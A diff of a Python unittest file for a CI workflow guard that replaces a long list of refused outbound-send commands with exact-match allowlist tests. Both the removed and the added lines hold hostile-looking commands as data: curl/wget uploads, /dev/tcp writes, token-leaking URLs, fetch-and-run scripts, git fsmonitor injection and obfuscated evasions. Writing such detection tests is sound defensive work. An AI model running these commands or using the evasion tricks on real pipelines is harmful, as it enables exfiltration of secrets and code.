@@ -1,7 +1,9 @@
-"""Issue #511: outbound send commands in run: are publish paths (check_guard_placement must refuse them).
+"""Issue #511 (owner decision): exact-match run: approval, and the policy that protects it.
 
-Each case writes one workflow into a temporary root and runs the placement check. Refused cases must raise; allowed
-cases (fetch-only use of the same tools) must pass. The file has no upload step, so the scope layer decides it.
+No shell is parsed here. A run: text passes only when it equals an approved text stored (by SHA-256) for its workflow file,
+job, step name, shell and runs-on. Each case builds a temporary repository, approves its texts with build_run_allowlist,
+then changes one thing and checks that enforced_check refuses it. Static matching cannot prevent network sends from scripts
+that an approved step calls; that is out of guaranteed scope (least privilege, secret separation, trusted publishing).
 """
 from pathlib import Path
 import json
@@ -12,324 +14,163 @@ import unittest
 sys.path.insert(0, str(Path(__file__).resolve().parents[2] / 'tools'))
 import artifact_guard as guard
 
-try:
-    import yaml  # noqa: F401
-except ImportError:   # without PyYAML every refusal is a placeholder, so a pass would prove nothing
-    raise SystemExit('PyYAML is required for the Issue #511 placement tests')
-
 PERMISSIONS = 'permissions:\n  contents: read\n'
+ALLOWLIST = 'tools/artifact_guard_run_allowlist.json'
 
 
-def workflow(run):
-    step = f'      - run: {json.dumps(run)}\n'
-    return f'name: t\non: [push]\n{PERMISSIONS}jobs:\n  j:\n    runs-on: ubuntu-latest\n    steps:\n{step}'
+def workflow(run='echo hi', job='j', name=None, shell=None, runs_on='ubuntu-24.04'):
+    name_line = f'        name: {name}\n' if name is not None else ''
+    shell_line = f'        shell: {shell}\n' if shell is not None else ''
+    return (f'name: t\non: [push]\n{PERMISSIONS}jobs:\n  {job}:\n    runs-on: {runs_on}\n    steps:\n'
+            f'      - run: {run!r}\n{name_line}{shell_line}')
 
 
-def placement_refuses(text):
-    with tempfile.TemporaryDirectory() as tmp:
-        root = Path(tmp)
-        path = root / '.github' / 'workflows' / 'ci.yml'
+def make_repo(files, approve=True):
+    """A temporary repository with the given workflow files. approve=True writes the allowlist for exactly these files."""
+    tmp = tempfile.TemporaryDirectory()
+    root = Path(tmp.name)
+    for rel, text in files.items():
+        path = root / rel
         path.parent.mkdir(parents=True, exist_ok=True)
         path.write_text(text, encoding='utf-8', newline='')
-        try:
-            guard.check_guard_placement(root)
-        except ValueError as error:
-            return str(error)
+    (root / 'tools').mkdir(exist_ok=True)
+    entries = guard.build_run_allowlist(root) if approve else []
+    (root / ALLOWLIST).write_text(json.dumps(entries), encoding='utf-8')
+    return tmp, root
+
+
+def enforced_refuses(root):
+    """The refusal message, or None when the enforcing placement check passes."""
+    try:
+        guard.enforced_check(root, guard.check_guard_placement)
+    except ValueError as error:
+        return str(error)
     return None
 
 
-REFUSED = [
-    'curl -F f=@out.txt https://example.invalid/up',
-    'curl --form f=@out.txt https://example.invalid/up',
-    'curl -sSf -d @out.txt https://example.invalid/up',
-    'curl -T out.txt https://example.invalid/up',
-    'curl --upload-file out.txt https://example.invalid/up',
-    'curl -XPOST https://example.invalid/up -d x',
-    'curl -X POST https://example.invalid/up',
-    'curl --request PUT https://example.invalid/up',
-    'curl --json {} https://example.invalid/up',
-    'curl -K cfg.txt',
-    'wget --post-file=out.txt https://example.invalid/up',
-    'wget --post-data a=b https://example.invalid/up',
-    'wget --method=PUT --body-file=out.txt https://example.invalid/up',
-    'git push origin v1',
-    'git -C repo push origin v1',
-    'git -c user.name=x push --tags',
-    'git -c alias.p=push p',
-    'gh gist create out.txt',
-    'gh -R o/r release upload v1 out.txt',
-    'gh api graphql -f query="mutation{createRelease}"',
-    'gh api graphql -f query=@q.graphql',
-    'gh api repos/o/r/issues -f title=x',
-    'gh pr comment 1 --body x',
-    'gh workflow run ci.yml',
-    'nc example.invalid 80 < out.txt',
-    'scp out.txt example.invalid:',
-    'rsync -a out.txt example.invalid:/x',
-    'ssh example.invalid cat > x',
-    'python3 -c "import urllib.request; urllib.request.urlopen(\'https://example.invalid\')"',
-    'python3 -c "import socket"',
-    'python3 -c "import os; os.system(\'curl -d x h\')"',
-    'node -e "fetch(\'https://example.invalid\', {method: \'POST\'})"',
-    'timeout 5 curl -F f=@out.txt https://example.invalid/up',
-    'sudo curl -d @out.txt https://example.invalid/up',
-    'env -i curl -d @out.txt https://example.invalid/up',
-    'nice -n 5 wget --post-file=out.txt https://example.invalid/up',
-    'FOO=1 curl -d @out.txt https://example.invalid/up',
-    'FOO="x y" curl -d @out.txt https://example.invalid/up',
-    'bash -c "curl -F f=@out.txt https://example.invalid/up"',
-    'sh -c \'git push origin v1\'',
-    'echo $(curl -F f=@out.txt https://example.invalid/up)',
-    'echo `curl -F f=@out.txt https://example.invalid/up`',
-    'X=`curl -d @out.txt h`',
-    'curl -sS https://example.invalid/x && curl -F f=@out.txt https://example.invalid/up',
-    'curl -sS https://example.invalid/x || curl -F f=@out.txt https://example.invalid/up',
-    'curl -sS https://example.invalid/x; curl -F f=@out.txt https://example.invalid/up',
-    'curl -sS https://example.invalid/x | curl -T - https://example.invalid/up',
-    '"cu"rl -F f=@out.txt https://example.invalid/up',
-    'c\\url -F f=@out.txt https://example.invalid/up',
-    '/usr/bin/curl -F f=@out.txt https://example.invalid/up',
-    'CMD=curl; $CMD -F f=@out.txt https://example.invalid/up',
-    'eval "curl -F f=@out.txt https://example.invalid/up"',
-    'npm publish',
-    'docker push example.invalid/x:1',
-    'twine upload dist/*',
-    'aws s3 cp out.txt s3://bucket/x',
-    'if curl -d @out.txt https://example.invalid/up; then echo ok; fi',
-    'env -S "curl -d @out.txt https://example.invalid/up"',
-    'cat out.txt > /dev/tcp/example.invalid/80',
-    'bash <<< "curl -F f=@out.txt https://example.invalid/up"',
-    '/usr/bin/cu[r]l -F f=@out.txt https://example.invalid/up',
-    '$(echo c)url -F f=@out.txt https://example.invalid/up',
-    'find . -exec curl -F f=@out.txt https://example.invalid/up \\;',
-    'setsid curl -d @out.txt https://example.invalid/up',
-    'sshpass -p secret scp out.txt example.invalid:',
-    'docker buildx build --push -t example.invalid/x:1 .',
-    'python3 -m twine upload dist/x.whl',
-    'yarn publish',
-    'cargo publish',
-    'git send-email 0001.patch',
-    'tftp example.invalid -c put out.txt',
-    'python3 -c "import base64; exec(base64.b64decode(\'aW1wb3J0IHNvY2tldA==\'))"',
-    'python3 -c "import os; os.execvp(\'curl\', [\'curl\', \'-F\', \'f=@out.txt\', \'https://example.invalid/up\'])"',
-    'Invoke-WebRequest -Method Post -InFile out.txt -Uri https://example.invalid/up',
-    'curl.exe -F f=@out.txt https://example.invalid/up',
-    'cat out.txt > /dev/"tcp"/example.invalid/80',
-]
-
-ALLOWED = [
-    'curl -fsSL https://example.invalid/x -o out.txt',
-    'curl -sS -X GET https://example.invalid/x',
-    'curl --request GET https://example.invalid/x',
-    'curl -sS https://example.invalid/x | sha256sum',
-    'bash tools/nightly_plan.sh',
-    'git diff --stat HEAD~1',
-    'gh run list --limit 5',
-    'wget -q https://example.invalid/x -O out.txt',
-    'wget --method=GET https://example.invalid/x',
-    'git fetch origin',
-    'git ls-remote origin',
-    'git rev-parse HEAD',
-    'git log --oneline -5',
-    'git clone --depth 1 https://example.invalid/r.git',
-    'gh api repos/o/r/rules/branches/main > out.json',
-    'gh api "repos/$GITHUB_REPOSITORY/actions/runs/$GITHUB_RUN_ID/attempts/1"',
-    'gh api --method GET repos/o/r/issues',
-    'gh run view 1 --json attempt',
-    'gh gist view abc',
-    'python3 tools/check.py',
-    'python3 tools/socket_probe.py',
-    'echo curl -d x is text',
-    'grep -r curl .github',
-    'make check',
-    'cp out.txt "$RUNNER_TEMP/x"',
-    'sha256sum out.txt',
-    'x=$(git rev-parse HEAD)',
-    'if git fetch origin; then echo ok; fi',
-    'find . -name "*.py" -print',
-]
+CI = '.github/workflows/ci.yml'
 
 
-class SendRefused(unittest.TestCase):
-    def test_send_commands_refused(self):
-        for run in REFUSED:
+class ApprovedTextTests(unittest.TestCase):
+    def check(self, text, approve_text=None):
+        tmp, root = make_repo({CI: approve_text if approve_text is not None else text})
+        self.addCleanup(tmp.cleanup)
+        (root / CI).write_text(text, encoding='utf-8', newline='')
+        return enforced_refuses(root)
+
+    def test_exact_approved_text_passes(self):
+        text = workflow('echo hi')
+        tmp, root = make_repo({CI: text})
+        self.addCleanup(tmp.cleanup)
+        self.assertIsNone(enforced_refuses(root))
+
+    def test_changed_run_text_refused(self):
+        self.assertIsNotNone(self.check(workflow('echo hello'), approve_text=workflow('echo hi')))
+
+    def test_changed_step_name_refused(self):
+        self.assertIsNotNone(self.check(workflow('echo hi', name='new'), approve_text=workflow('echo hi', name='old')))
+
+    def test_changed_job_refused(self):
+        self.assertIsNotNone(self.check(workflow('echo hi', job='other'), approve_text=workflow('echo hi', job='j')))
+
+    def test_added_shell_refused(self):
+        self.assertIsNotNone(self.check(workflow('echo hi', shell='bash'), approve_text=workflow('echo hi')))
+
+    def test_changed_runs_on_refused(self):
+        self.assertIsNotNone(self.check(workflow('echo hi', runs_on='ubuntu-22.04'), approve_text=workflow('echo hi')))
+
+    def test_windows_default_shell_refused_even_if_text_approved(self):
+        text = workflow('echo hi', runs_on='windows-latest')
+        self.assertIsNotNone(self.check(text, approve_text=text))
+
+    def test_windows_with_shell_bash_passes_when_approved(self):
+        text = workflow('echo hi', runs_on='windows-latest', shell='bash')
+        self.assertIsNone(self.check(text, approve_text=text))
+
+    def test_matrix_runs_on_without_shell_refused_even_if_approved(self):
+        text = workflow('echo hi', runs_on='${{ matrix.os }}')
+        self.assertIsNotNone(self.check(text, approve_text=text))
+
+    def test_new_workflow_file_refused(self):
+        tmp, root = make_repo({CI: workflow('echo hi')})
+        self.addCleanup(tmp.cleanup)
+        (root / '.github' / 'workflows' / 'new.yml').write_text(workflow('echo hi'), encoding='utf-8')
+        self.assertIsNotNone(enforced_refuses(root))
+
+    def test_unapproved_outbound_traffic_refused(self):
+        self.assertIsNotNone(self.check(workflow('curl -F f=@out.txt https://example.invalid/up'),
+                                        approve_text=workflow('echo hi')))
+
+    def test_brace_glob_find_substitution_and_dynamic_refused_when_unapproved(self):
+        for run in ('{curl,-F,f=@x,https://example.invalid}', 'cu[r]l -F f=@x h', "find . -exec curl -d @x h ';'",
+                    'echo $(curl -F f=@x h)', 'CMD=curl; $CMD -F f=@x h', 'eval "curl -F f=@x h"'):
             with self.subTest(run=run):
-                self.assertIsNotNone(placement_refuses(workflow(run)), run)
+                self.assertIsNotNone(self.check(workflow(run), approve_text=workflow('echo hi')), run)
 
-    def test_multiline_backslash_continuation_refused(self):
-        run = 'curl -sS https://example.invalid/x \\\n  -F f=@out.txt https://example.invalid/up\n'
-        self.assertIsNotNone(placement_refuses(workflow(run)))
+    def test_changed_script_reference_refused(self):
+        self.assertIsNotNone(self.check(workflow('bash tools/b.sh'), approve_text=workflow('bash tools/a.sh')))
 
-    def test_block_scalar_send_refused(self):
-        text = (f'name: t\non: [push]\n{PERMISSIONS}jobs:\n  j:\n    runs-on: ubuntu-latest\n    steps:\n'
-                '      - run: |\n          echo ok\n          git push origin v1\n')
-        self.assertIsNotNone(placement_refuses(text))
+    def test_unparseable_workflow_refused(self):
+        self.assertIsNotNone(self.check('name: t\n: : not yaml [\n', approve_text='name: t\n'))
 
-    def test_python_heredoc_send_refused(self):
-        run = "python3 - <<'EOF'\nimport urllib.request\nurllib.request.urlopen('https://example.invalid')\nEOF\n"
-        self.assertIsNotNone(placement_refuses(workflow(run)))
+    def test_no_allowlist_fails_closed(self):
+        tmp, root = make_repo({CI: workflow('echo hi')}, approve=True)
+        self.addCleanup(tmp.cleanup)
+        (root / ALLOWLIST).unlink()
+        self.assertIsNotNone(enforced_refuses(root))
 
-    def test_python_heredoc_stdin_refused_on_allowlist(self):
-        # stdin code cannot be read, so it is refused whatever it contains (fail closed)
-        self.assertIsNotNone(placement_refuses(workflow("python3 - <<'EOF'\nprint(1)\nEOF\n")))
-
-    def test_gh_expression_python_still_passes(self):
-        run = '"${{ steps.pyresolve.outputs.python }}" tools/check.py'
-        self.assertIsNone(placement_refuses(workflow(run)))
+    def test_malformed_allowlist_fails_closed(self):
+        tmp, root = make_repo({CI: workflow('echo hi')})
+        self.addCleanup(tmp.cleanup)
+        (root / ALLOWLIST).write_text('{"not": "a list"}', encoding='utf-8')
+        self.assertIsNotNone(enforced_refuses(root))
 
 
-class FetchOnlyAllowed(unittest.TestCase):
-    def test_allowed_operations_pass(self):
-        for run in ALLOWED:
-            with self.subTest(run=run):
-                self.assertIsNone(placement_refuses(workflow(run)), run)
+class PolicyTests(unittest.TestCase):
+    """A pull request cannot approve a change to the guard or its allowlist: the candidate must equal the trusted copy."""
+
+    def trusted_and_candidate(self):
+        trusted_tmp, trusted = make_repo({CI: workflow('echo hi')})
+        cand_tmp, cand = make_repo({CI: workflow('echo hi')})
+        self.addCleanup(trusted_tmp.cleanup)
+        self.addCleanup(cand_tmp.cleanup)
+        for rel in ('tools/artifact_guard.py',):
+            (cand / rel).parent.mkdir(parents=True, exist_ok=True)
+            (cand / rel).write_text((Path(guard.__file__)).read_text(encoding='utf-8'), encoding='utf-8')
+            (trusted / rel).parent.mkdir(parents=True, exist_ok=True)
+            (trusted / rel).write_text((Path(guard.__file__)).read_text(encoding='utf-8'), encoding='utf-8')
+        return trusted, cand
+
+    def test_identical_guard_and_allowlist_pass(self):
+        trusted, cand = self.trusted_and_candidate()
+        guard.policy_violations(cand, trusted)
+
+    def test_self_approval_in_allowlist_refused(self):
+        trusted, cand = self.trusted_and_candidate()
+        entries = json.loads((cand / ALLOWLIST).read_text(encoding='utf-8'))
+        entries.append({'workflow': CI, 'job': 'j', 'step': None, 'shell': None, 'runs_on': 'ubuntu-24.04',
+                        'sha256': guard._run_digest('curl -F f=@x https://example.invalid/up')})
+        (cand / ALLOWLIST).write_text(json.dumps(entries), encoding='utf-8')
+        with self.assertRaisesRegex(ValueError, 'trusted-main policy'):
+            guard.policy_violations(cand, trusted)
+
+    def test_changed_guard_refused(self):
+        trusted, cand = self.trusted_and_candidate()
+        (cand / 'tools' / 'artifact_guard.py').write_text('# loosened\n', encoding='utf-8')
+        with self.assertRaisesRegex(ValueError, 'artifact_guard.py differs'):
+            guard.policy_violations(cand, trusted)
+
+    def test_missing_trusted_copy_fails_closed(self):
+        trusted, cand = self.trusted_and_candidate()
+        (trusted / ALLOWLIST).unlink()
+        with self.assertRaisesRegex(ValueError, 'missing'):
+            guard.policy_violations(cand, trusted)
 
 
-def workflow_on(runs_on, run, shell=None):
-    shell_line = f'        shell: {shell}\n' if shell else ''
-    return (f'name: t\non: [push]\n{PERMISSIONS}jobs:\n  j:\n    runs-on: {runs_on}\n    steps:\n'
-            f'      - run: {json.dumps(run)}\n{shell_line}')
-
-
-class ReviewRound2(unittest.TestCase):
-    """Owner-directed hardening: Windows default shell, brace lists, find globs, comments, heredocs, parse faults."""
-
-    def test_windows_job_without_shell_bash_refused(self):
-        self.assertIsNotNone(placement_refuses(workflow_on('windows-latest', 'echo hi')))
-
-    def test_matrix_runs_on_without_shell_bash_refused(self):
-        self.assertIsNotNone(placement_refuses(workflow_on('${{ matrix.os }}', 'echo hi')))
-
-    def test_windows_job_with_shell_bash_passes(self):
-        self.assertIsNone(placement_refuses(workflow_on('windows-latest', 'echo hi', shell='bash')))
-
-    def test_ubuntu_job_without_shell_passes(self):
-        self.assertIsNone(placement_refuses(workflow_on('ubuntu-24.04', 'echo hi')))
-
-    def test_brace_list_send_refused(self):
-        self.assertIsNotNone(placement_refuses(workflow('{curl,-F,f=@out.txt,https://example.invalid/up}')))
-
-    def test_find_exec_glob_send_refused(self):
-        run = 'find . -exec cu[r]l -F f=@out.txt https://example.invalid/up \\;'
-        self.assertIsNotNone(placement_refuses(workflow(run)))
-
-    def test_timeout_glob_send_refused(self):
-        self.assertIsNotNone(placement_refuses(workflow('timeout 5 cu[r]l -F f=@out.txt https://example.invalid/up')))
-
-    def test_hash_inside_word_does_not_hide_send(self):
-        self.assertIsNotNone(placement_refuses(workflow('echo a#b; curl -F f=@out.txt https://example.invalid/up')))
-
-    def test_comment_before_send_line_still_refused(self):
-        run = 'git status  # note\ncurl -F f=@out.txt https://example.invalid/up\n'
-        self.assertIsNotNone(placement_refuses(workflow(run)))
-
-    def test_unterminated_heredoc_refused(self):
-        self.assertIsNotNone(placement_refuses(workflow("bash <<'EOF'\ncurl -F f=@out.txt https://example.invalid/up\n")))
-
-    def test_comment_with_apostrophe_passes(self):
-        self.assertIsNone(placement_refuses(workflow("make check # it's fine\n")))
-
-    def test_hash_inside_word_and_fetch_passes(self):
-        self.assertIsNone(placement_refuses(workflow('echo a#b; git fetch origin')))
-
-    def test_quoted_heredoc_body_is_scanned_and_refused(self):
-        # a quoted-delimiter body can be written to a file and run later, so it is read as shell (fails closed)
-        self.assertIsNotNone(placement_refuses(workflow("cat > x.txt <<'EOF'\ncurl -F f=@x h\nEOF\nbash x.txt\n")))
-
-    def test_comment_then_continuation_hides_nothing(self):
-        self.assertIsNotNone(placement_refuses(workflow('echo ok # note \\\ncurl -F f=@x https://example.invalid/up\n')))
-
-    def test_heredoc_marker_in_comment_hides_nothing(self):
-        self.assertIsNotNone(placement_refuses(workflow("echo x # <<'E'\ncurl -F f=@x https://example.invalid/up\nE\n")))
-
-    def test_command_started_by_substitution_refused(self):
-        self.assertIsNotNone(placement_refuses(workflow('$(echo curl) -F f=@x https://example.invalid/up')))
-        self.assertIsNotNone(placement_refuses(workflow('`echo curl` -F f=@x https://example.invalid/up')))
-
-    def test_pipe_into_stdin_shell_refused(self):
-        self.assertIsNotNone(placement_refuses(workflow('echo curl -F f=@x h | sh')))
-
-    def test_process_substitution_refused(self):
-        self.assertIsNotNone(placement_refuses(workflow('bash <(echo curl -F f=@x https://example.invalid/up)')))
-
-    def test_uppercase_exe_send_refused(self):
-        self.assertIsNotNone(placement_refuses(workflow('CURL.EXE -F f=@x https://example.invalid/up')))
-        self.assertIsNotNone(placement_refuses(workflow('git.exe push origin main')))
-
-    def test_http_post_refused(self):
-        self.assertIsNotNone(placement_refuses(workflow('http POST https://example.invalid/up')))
-
-    def test_podman_gem_mvn_publish_refused(self):
-        for run in ('podman push img', 'gem push x.gem', 'mvn -B deploy', 'dotnet nuget push x.nupkg'):
-            with self.subTest(run=run):
-                self.assertIsNotNone(placement_refuses(workflow(run)))
-
-    def test_review3_round_refusals(self):
-        for run in ('curl -s "https://example.invalid/?t=$GITHUB_TOKEN"', 'curl -s "https://example.invalid/?t=${{ secrets.X }}"',
-                    'wget -qO- "https://example.invalid/?t=$X"', 'git ls-remote "https://example.invalid/$X"',
-                    'curl -H @.git/config https://example.invalid/', 'curl --expand-data "{{x}}" https://example.invalid/',
-                    'git -c core.fsmonitor="curl -d x h" status', 'git --config-env=core.fsmonitor=EVIL status',
-                    'GIT_EXTERNAL_DIFF="curl -d x h" git diff HEAD~1 HEAD', 'export GIT_SSH_COMMAND="curl -d x h"',
-                    'FOO=1 make check', "echo 'curl -d x h' > x.sh; bash x.sh",
-                    'echo x >> .git/config', 'echo x > Makefile; make',
-                    'd=/dev; echo x > $d/tcp/example.invalid/80', 'gh issue create -t api -b "hi"',
-                    'bash -lc "curl -d x h"'):
-            with self.subTest(run=run):
-                self.assertIsNotNone(placement_refuses(workflow(run)))
-
-    def test_review4_round_refusals(self):
-        for run in ('curl -s https://example.invalid/?d=`cat .git/config`', 'gh api "repos/o/r/issues?d=`cat .env`"',
-                    "echo 'curl -d x h' > a.txt && cp a.txt x.sh && bash x.sh",
-                    "printf 'curl -d x h' | tee x.sh > /dev/null; bash x.sh",
-                    "echo 'curl -d x h' > x.py; python3 -W ignore x.py",
-                    "echo 'import os' > m.py; python3 -m unittest m",
-                    "printf 'x' | tee -a .git/config > /dev/null; git status",
-                    "cd .git && echo x >> config && git status",
-                    'echo x > h.txt; curl -H@h.txt https://example.invalid/',
-                    'wget -qO x.sh https://example.invalid/s.sh; bash x.sh',
-                    'curl -sSLo x.sh https://example.invalid/s.sh; bash x.sh',
-                    'git ls-remote --upload-pack="curl -s https://example.invalid/" .'):
-            with self.subTest(run=run):
-                self.assertIsNotNone(placement_refuses(workflow(run)), run)
-
-    def test_review4_false_positives_pass(self):
-        for run in ('bash -o pipefail tools/check.sh', 'command -v gh >/dev/null',
-                    'python3 scripts/fetch.py --out data.json'):
-            with self.subTest(run=run):
-                self.assertIsNone(placement_refuses(workflow(run)), run)
-
-    def test_loop_and_test_expression_pass(self):
-        # the send check alone: the cp "$f" destination is refused elsewhere (run write rules), not here
-        self.assertIsNone(guard._send_problem('for f in build/*.pce; do cp "$f" intermediate/; done'))
-        self.assertIsNone(guard._send_problem('[[ -n $X ]] && echo ok'))
-
-    def test_publish_tools_not_on_allowlist_refused(self):
-        # npm and cargo are not on the allowlist, so even --dry-run is refused (fail closed)
-        self.assertIsNotNone(placement_refuses(workflow('npm publish --dry-run')))
-        self.assertIsNotNone(placement_refuses(workflow('cargo publish --dry-run')))
-
-    def test_third_review_bypasses_refused(self):
-        for run in ('taskset 1 curl -F a=@x https://example.invalid/up', 'chronic curl -F a=@x https://example.invalid/up',
-                    'docker run --rm curlimages/curl -sS -F f=@x https://example.invalid/up',
-                    'poetry publish --build', 'pypy3 -c "import urllib.request"', 'gcloud storage cp x gs://b',
-                    'python3 -c "print(1)"', 'docker build -t x .', 'go build', 'bash <<< "curl -F f=@x h"',
-                    'sudo curl -F f=@x h', 'curl -s "https://example.invalid/?t=$X"'):
-            with self.subTest(run=run):
-                self.assertIsNotNone(placement_refuses(workflow(run)))
-
-    def test_word_start_glue_only_refused(self):
-        self.assertIsNone(placement_refuses(workflow('echo "v$(git rev-parse --short HEAD)-dev"')))
-
-    def test_gh_api_graphql_without_fields_refused(self):
-        self.assertIsNotNone(placement_refuses(workflow('gh api graphql')))
-
-    def test_parse_fault_refuses_not_passes(self):
-        from unittest import mock
-        with mock.patch.object(guard, '_send_problem_checked', side_effect=RuntimeError('boom')):
-            self.assertIsNotNone(guard._send_problem('echo hi'))
-
-    def test_send_inside_comment_only_passes(self):
-        self.assertIsNone(placement_refuses(workflow('git status # curl -F f=@x h')))
+class RepositoryTests(unittest.TestCase):
+    def test_real_repository_passes_exact_match(self):
+        # false-refusal guard: every run: text in the real workflows is approved by the reviewed allowlist
+        self.assertIsNone(enforced_refuses(Path(guard.ROOT)))
 
 
 if __name__ == '__main__':
